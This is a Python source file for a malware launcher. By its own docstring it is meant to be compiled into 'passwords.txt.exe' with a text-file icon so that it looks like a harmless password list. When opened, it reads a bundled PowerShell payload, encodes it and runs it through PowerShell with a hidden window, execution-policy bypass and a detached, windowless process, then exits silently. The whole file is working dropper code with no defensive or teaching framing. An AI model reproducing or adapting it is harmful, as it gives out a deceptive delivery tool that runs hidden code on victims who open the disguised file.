#!/usr/bin/env python3
"""
Anytime Payload Launcher (PyInstaller-compatible)
This launcher will be compiled to passwords.txt.exe with text icon
Reads and executes the bundled PowerShell payload
"""

import subprocess
import sys
import base64
import os


def get_resource_path(relative_path):
    """Get absolute path to resource, works for dev and for PyInstaller"""
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except AttributeError:
        # Running in normal Python environment
        base_path = os.path.dirname(os.path.abspath(__file__))

    return os.path.join(base_path, relative_path)


def main():
    """Read PowerShell payload and execute it"""
    try:
        # Read the bundled payload.ps1 file
        payload_path = get_resource_path("payload.ps1")
        with open(payload_path, "r", encoding="utf-8") as f:
            payload_script = f.read()

        # Encode to UTF-16LE (PowerShell requirement)
        payload_bytes = payload_script.encode("utf-16le")

        # Base64 encode
        payload_base64 = base64.b64encode(payload_bytes).decode("ascii")

        # Check if we're in dev mode (dev_mode marker exists in dist folder)
        dev_mode = False
        try:
            # Check if .dev_mode marker exists next to the .exe
            exe_dir = os.path.dirname(os.path.abspath(sys.executable))
            dev_marker = os.path.join(exe_dir, ".dev_mode")
            dev_mode = os.path.exists(dev_marker)
        except:
            pass

        # Build PowerShell command
        ps_args = ["powershell.exe"]

        if not dev_mode:
            # Production: Hidden window
            ps_args.extend(["-WindowStyle", "Hidden"])

        ps_args.extend(
            [
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-NonInteractive",
                "-EncodedCommand",
                payload_base64,
            ]
        )

        # Set creation flags based on mode
        creation_flags = 0
        stdout_dest = subprocess.DEVNULL
        stderr_dest = subprocess.DEVNULL

        if sys.platform == "win32" and not dev_mode:
            # Production: Detached, hidden process
            DETACHED_PROCESS = 0x00000008
            CREATE_NO_WINDOW = 0x08000000
            creation_flags = DETACHED_PROCESS | CREATE_NO_WINDOW
        elif dev_mode:
            # Dev mode: Show output
            stdout_dest = None
            stderr_dest = None

        subprocess.Popen(
            ps_args,
            shell=False,
            stdout=stdout_dest,
            stderr=stderr_dest,
            creationflags=creation_flags,
        )
    except Exception as e:
        if dev_mode:
            print(f"ERROR: {e}")
        pass

    # Exit immediately without waiting for PowerShell
    sys.exit(0)


if __name__ == "__main__":
    main()
